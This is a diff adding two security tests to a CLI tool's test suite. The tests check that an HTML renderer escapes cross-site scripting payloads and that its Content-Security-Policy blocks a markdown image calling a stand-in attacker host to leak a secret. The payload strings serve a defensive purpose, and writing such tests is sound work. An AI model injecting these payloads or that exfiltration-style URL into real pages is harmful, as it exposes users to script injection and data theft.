@@ -278,3 +278,22 @@ def test_default_state_dir_differs_per_workspace(tmp_path):
     b = cli.resolve_mrai_dir(None, tmp_path / "y" / "api")
     assert a != b  # same basename, different checkouts: no shared session
     assert a == cli.resolve_mrai_dir(None, tmp_path / "x" / "api")  # stable
+
+
+def test_render_escapes_html_from_the_answer(tmp_path):
+    hostile = "<script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))"
+    html = cli._write_render(tmp_path, "t", hostile).read_text()
+    body = html.split("<body>", 1)[1]
+    assert "<script>alert" not in body and "&lt;script&gt;" in body
+    assert "<img" not in body
+    assert 'href="javascript:' not in body
+
+
+def test_render_csp_allows_only_its_own_script(tmp_path):
+    html = cli._write_render(tmp_path, "t", "![](https://evil.example/?d=secret)").read_text()
+    csp = html.split('http-equiv="Content-Security-Policy" content="', 1)[1].split('"', 1)[0]
+    script = html.rsplit("<script>", 1)[1].split("</script>", 1)[0]
+    digest = cli.base64.b64encode(cli.hashlib.sha256(script.encode()).digest()).decode()
+    assert f"'sha256-{digest}'" in csp  # the inline script's hash matches what is served
+    assert "img-src data:" in csp  # a remote image (data leak on open) is blocked
+    assert html.count('integrity="sha512-') == 2  # both CDN files pinned
